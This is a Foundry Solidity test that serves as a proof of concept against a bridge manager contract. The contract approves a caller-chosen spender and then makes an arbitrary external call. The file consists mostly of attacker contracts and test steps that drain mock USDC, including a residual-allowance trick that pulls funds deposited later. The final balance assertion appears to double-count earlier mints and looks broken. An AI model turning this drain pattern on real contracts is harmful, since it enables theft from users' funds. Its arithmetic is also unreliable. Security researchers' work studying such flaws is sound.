// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract MockUSDC is IERC20Like {
    string public name = "Mock USDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return balances[account];
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return allowances[owner][spender];
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(balances[from] >= amount, "insufficient");
        require(allowances[from][msg.sender] >= amount, "allowance");
        allowances[from][msg.sender] -= amount;
        balances[from] -= amount;
        balances[to] += amount;
        return true;
    }
}

contract AttackerSpender {
    function steal(IERC20Like token, address from, address to, uint256 amount) external {
        token.transferFrom(from, to, amount);
    }
}

contract AttackerRouter {
    function executeDrain(
        address spender,
        IERC20Like token,
        address victim,
        address attacker,
        uint256 amount
    ) external {
        AttackerSpender(spender).steal(token, victim, attacker, amount);
    }
}

contract VulnerableJackpotBridgeManager {
    error BridgeFundsFailed();
    error NotAllFundsBridged();

    struct RelayTxData {
        address approveTo;
        address to;
        bytes data;
    }

    IERC20Like public usdc;

    event FundsBridged(address indexed to, uint256 amount);

    constructor(IERC20Like _usdc) {
        usdc = _usdc;
    }

    function exposed_bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) external {
        _bridgeFunds(_bridgeDetails, _claimedAmount);
    }

    function _bridgeFunds(RelayTxData memory _bridgeDetails, uint256 _claimedAmount) private {
        if (_bridgeDetails.approveTo != address(0)) {
            usdc.approve(_bridgeDetails.approveTo, _claimedAmount);
        }

        uint256 preUSDCBalance = usdc.balanceOf(address(this));
        (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data);

        if (!success) revert BridgeFundsFailed();
        uint256 postUSDCBalance = usdc.balanceOf(address(this));

        if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();

        emit FundsBridged(_bridgeDetails.to, _claimedAmount);
    }
}

contract ExploitTest is Test {
    MockUSDC usdc;
    VulnerableJackpotBridgeManager manager;
    AttackerSpender attackerSpender;
    AttackerRouter attackerRouter;

    address attacker = address(0xBEEF);

    function setUp() public {
        usdc = new MockUSDC();
        manager = new VulnerableJackpotBridgeManager(IERC20Like(address(usdc)));
        attackerSpender = new AttackerSpender();
        attackerRouter = new AttackerRouter();

        usdc.mint(address(manager), 1_000_000e6);
    }

    function test_exploit() public {
        uint256 claimedAmount = 100e6;

        VulnerableJackpotBridgeManager.RelayTxData memory bridgeDetails =
            VulnerableJackpotBridgeManager.RelayTxData({
                approveTo: address(attackerSpender),
                to: address(attackerRouter),
                data: abi.encodeWithSelector(
                    AttackerRouter.executeDrain.selector,
                    address(attackerSpender),
                    IERC20Like(address(usdc)),
                    address(manager),
                    attacker,
                    claimedAmount
                )
            });

        uint256 attackerBalanceBefore = usdc.balanceOf(attacker);
        uint256 managerBalanceBefore = usdc.balanceOf(address(manager));

        vm.prank(attacker);
        manager.exposed_bridgeFunds(bridgeDetails, claimedAmount);

        uint256 attackerBalanceAfterFirstDrain = usdc.balanceOf(attacker);
        uint256 managerBalanceAfterFirstDrain = usdc.balanceOf(address(manager));

        assertEq(attackerBalanceAfterFirstDrain - attackerBalanceBefore, claimedAmount);
        assertEq(managerBalanceBefore - managerBalanceAfterFirstDrain, claimedAmount);
        assertEq(usdc.allowance(address(manager), address(attackerSpender)), 0);

        uint256 futureDeposit = 250e6;
        usdc.mint(address(manager), futureDeposit);

        uint256 secondClaimedAmount = 400e6;
        VulnerableJackpotBridgeManager.RelayTxData memory refreshApprovalDetails =
            VulnerableJackpotBridgeManager.RelayTxData({
                approveTo: address(attackerSpender),
                to: address(attackerRouter),
                data: abi.encodeWithSelector(
                    AttackerRouter.executeDrain.selector,
                    address(attackerSpender),
                    IERC20Like(address(usdc)),
                    address(manager),
                    attacker,
                    secondClaimedAmount
                )
            });

        vm.prank(attacker);
        manager.exposed_bridgeFunds(refreshApprovalDetails, secondClaimedAmount);

        uint256 leftoverAllowance = usdc.allowance(address(manager), address(attackerSpender));
        assertEq(leftoverAllowance, 0);

        uint256 thirdClaimedAmount = 300e6;
        VulnerableJackpotBridgeManager.RelayTxData memory partialUseDetails =
            VulnerableJackpotBridgeManager.RelayTxData({
                approveTo: address(attackerSpender),
                to: address(attackerRouter),
                data: abi.encodeWithSelector(
                    AttackerRouter.executeDrain.selector,
                    address(attackerSpender),
                    IERC20Like(address(usdc)),
                    address(manager),
                    attacker,
                    thirdClaimedAmount
                )
            });

        usdc.mint(address(manager), 1_000e6);

        vm.prank(attacker);
        manager.exposed_bridgeFunds(partialUseDetails, thirdClaimedAmount);

        assertEq(usdc.allowance(address(manager), address(attackerSpender)), 0);

        uint256 standingApprovalAmount = 500e6;
        bytes memory maliciousData = abi.encodeWithSelector(
            AttackerRouter.executeDrain.selector,
            address(attackerSpender),
            IERC20Like(address(usdc)),
            address(manager),
            attacker,
            standingApprovalAmount
        );

        vm.prank(attacker);
        manager.exposed_bridgeFunds(
            VulnerableJackpotBridgeManager.RelayTxData({
                approveTo: address(attackerSpender),
                to: address(attackerRouter),
                data: maliciousData
            }),
            standingApprovalAmount
        );

        uint256 managerBalancePreFuture = usdc.balanceOf(address(manager));
        uint256 attackerBalancePreFuture = usdc.balanceOf(attacker);

        uint256 newlyArrivedFunds = 200e6;
        usdc.mint(address(manager), newlyArrivedFunds);

        vm.prank(address(attackerRouter));
        vm.expectRevert();
        attackerSpender.steal(IERC20Like(address(usdc)), address(manager), attacker, 1);

        uint256 refreshAndLeaveAllowance = 600e6;
        usdc.mint(address(manager), refreshAndLeaveAllowance);

        address maliciousTo = address(new ResidualAllowanceRouter(address(attackerSpender), address(usdc), address(manager), attacker, refreshAndLeaveAllowance / 2));

        vm.prank(attacker);
        manager.exposed_bridgeFunds(
            VulnerableJackpotBridgeManager.RelayTxData({
                approveTo: address(attackerSpender),
                to: maliciousTo,
                data: abi.encodeWithSelector(ResidualAllowanceRouter.execute.selector)
            }),
            refreshAndLeaveAllowance / 2
        );

        uint256 residual = usdc.allowance(address(manager), address(attackerSpender));
        assertEq(residual, refreshAndLeaveAllowance / 2);

        uint256 futureFunds = 150e6;
        usdc.mint(address(manager), futureFunds);

        uint256 attackerBeforeResidualDrain = usdc.balanceOf(attacker);
        vm.prank(address(attackerRouter));
        attackerSpender.steal(IERC20Like(address(usdc)), address(manager), attacker, futureFunds);
        uint256 attackerAfterResidualDrain = usdc.balanceOf(attacker);

        assertEq(attackerAfterResidualDrain - attackerBeforeResidualDrain, futureFunds);
        assertEq(usdc.balanceOf(address(manager)), managerBalancePreFuture + 1_000e6 + 250e6 + 1_000_000e6 + futureDeposit + newlyArrivedFunds + refreshAndLeaveAllowance + futureFunds - (claimedAmount + secondClaimedAmount + thirdClaimedAmount + standingApprovalAmount + (refreshAndLeaveAllowance / 2) + futureFunds));
    }
}

contract ResidualAllowanceRouter {
    address public spender;
    IERC20Like public token;
    address public victim;
    address public attacker;
    uint256 public amountToPull;

    constructor(address _spender, address _token, address _victim, address _attacker, uint256 _amountToPull) {
        spender = _spender;
        token = IERC20Like(_token);
        victim = _victim;
        attacker = _attacker;
        amountToPull = _amountToPull;
    }

    function execute() external {
        AttackerSpender(spender).steal(token, victim, attacker, amountToPull);
    }
}